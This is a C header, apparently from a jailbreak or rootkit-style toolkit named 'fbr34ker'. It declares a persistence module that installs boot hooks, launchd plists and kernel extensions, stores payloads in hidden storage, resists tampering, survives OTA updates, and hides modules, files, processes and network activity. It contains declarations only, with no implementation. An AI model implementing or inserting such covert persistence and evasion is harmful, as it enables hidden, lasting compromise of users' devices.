#pragma once
#include "fbr34ker/types.h"

#define MAX_PERSISTENCE_HOOKS 16U
#define PERSISTENCE_HIDDEN_STORAGE_SIZE (64U * 1024U)
#define PERSISTENCE_PAYLOAD_MAX_SIZE (32U * 1024U)
#define PERSISTENCE_EVASION_MAX_COUNT 8U

typedef enum {
    PERSISTENCE_TYPE_BOOT_HOOK = 0,
    PERSISTENCE_TYPE_LAUNCHD_PLIST,
    PERSISTENCE_TYPE_KERNEL_EXTENSION,
    PERSISTENCE_TYPE_HIDDEN_STORAGE,
    PERSISTENCE_TYPE_PAYLOAD_DEPLOY,
    PERSISTENCE_TYPE_TAMPER_RESIST,
    PERSISTENCE_TYPE_OTA_PERSIST,
    PERSISTENCE_TYPE_EVASION,
    PERSISTENCE_TYPE_COUNT
} persistence_type_t;

typedef enum {
    PERSISTENCE_STATE_INACTIVE = 0,
    PERSISTENCE_STATE_DEPLOYED,
    PERSISTENCE_STATE_ACTIVE,
    PERSISTENCE_STATE_DETECTED,
    PERSISTENCE_STATE_FAILED
} persistence_state_t;

typedef struct {
    char name[48U];
    persistence_type_t type;
    persistence_state_t state;
    u64 target_offset;
    u64 payload_size;
    bool deployed;
    bool active;
    bool hidden;
} persistence_entry_t;

typedef struct {
    persistence_entry_t hooks[MAX_PERSISTENCE_HOOKS];
    u32 hook_count;
    u32 active_count;
    u32 detected_count;
    u64 hidden_storage_base;
    u64 hidden_storage_size;
    bool persistence_active;
    bool tamper_resistant;
    bool ota_persistent;
    u8 hidden_storage[PERSISTENCE_HIDDEN_STORAGE_SIZE];
} persistence_status_t;

typedef enum {
    EVASION_HIDE_KERNEL_MODULE = 0,
    EVASION_HIDE_FILE_SYSTEM,
    EVASION_HIDE_PROCESS,
    EVASION_HIDE_NETWORK,
    EVASION_HIDE_SYSTEM_HOOK,
    EVASION_TYPE_COUNT
} evasion_type_t;

void persistence_init(void);
persistence_status_t persistence_status(void);

bool persistence_register_hook(const char *name, persistence_type_t type,
                                u64 target_offset, u64 payload_size);
bool persistence_deploy_all(void);
bool persistence_deploy_by_type(persistence_type_t type);
bool persistence_activate_all(void);

bool persistence_install_boot_hook(const char *hook_path, const u8 *payload,
                                    usize payload_size);
bool persistence_install_launchd_plist(const char *label, const char *program_path);
bool persistence_deploy_kernel_extension(const u8 *kext_data, usize kext_size);
bool persistence_allocate_hidden_storage(u64 base, u64 size);
bool persistence_store_payload(const char *name, const u8 *data, usize data_size);

bool persistence_apply_evasion(evasion_type_t type);
bool persistence_enable_tamper_resistance(void);
bool persistence_enable_ota_persistence(void);

bool persistence_available(void);
bool persistence_active(void);
const char *persistence_type_name(persistence_type_t type);
const char *persistence_state_name(persistence_state_t state);
const char *evasion_type_name(evasion_type_t type);
u32 persistence_hook_count(void);
bool persistence_verify_hidden_storage(void);
